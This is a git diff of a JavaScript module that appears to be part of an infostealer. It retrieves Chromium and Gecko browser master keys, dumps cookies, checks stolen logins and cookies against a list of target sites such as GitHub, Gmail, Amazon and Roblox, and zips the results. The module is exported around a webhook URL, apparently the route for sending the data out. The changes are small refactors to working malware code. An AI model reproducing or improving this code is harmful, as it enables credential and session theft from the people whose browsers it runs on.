@@ -11,11 +11,11 @@ const hardware = require('./../../utils/hardware/hardware.js');
 
 const browsersProfiles = require('./profiles.js');
 
-const { Chromium } = require('./chromium.js');
-const chromium = new Chromium();
+const c = require('./chromium.js');
+const chromium = new c.Chromium();
 
-const { Gecko } = require('./gecko.js');
-const gecko = new Gecko();
+const g = require('./gecko.js');
+const gecko = new g.Gecko();
 
 const browsers = {
     downloads: [],
@@ -54,7 +54,7 @@ const Chromiumbrowsers = async () => {
                 browser: browser
             }));
 
-            const MasterKey = chromium.GetMasterKey(fullPath)
+            const MasterKey = await chromium.GetMasterKey(fullPath)
 
             if (!MasterKey) {
                 continue;
@@ -198,7 +198,7 @@ module.exports = async (webhookUrl) => {
         await fileutil.writeDataToFile(browserTempPath, `cookies_${browser.toLowerCase()}.txt`, cookies)
     }
 
-    const keywords = (data) => {
+    const keywords = (array) => {
         const sites = [
             "replit", "hostinger", "cloudflare", "origin", "amazon", "twitter", "aliexpress", "netflix", "roblox", "twitch",
             "facebook", "riotgames", "card", "github", "telegram", "protonmail", "gmail", "youtube", "onoff",
@@ -210,7 +210,7 @@ module.exports = async (webhookUrl) => {
         const loginSites = new Set();
         const cookieSites = new Set();
 
-        data.forEach(item => {
+        array.forEach(item => {
             const url = item.origin_url;
             const match = url.match(/(?:https?:\/\/)?(?:www\.)?(\.?([^\/]+))?(.*)/);
 
@@ -236,7 +236,7 @@ module.exports = async (webhookUrl) => {
         }
     };
 
-    const resultKeywords = keywords([...chromium.GetSites(), ...gecko.GetSites()]);
+    const resultKeywords = keywords([...structures.BrowserStatistics.sites]);
 
     const browserTempZip = path.join(os.tmpdir(), 'browsers.zip');
     try {
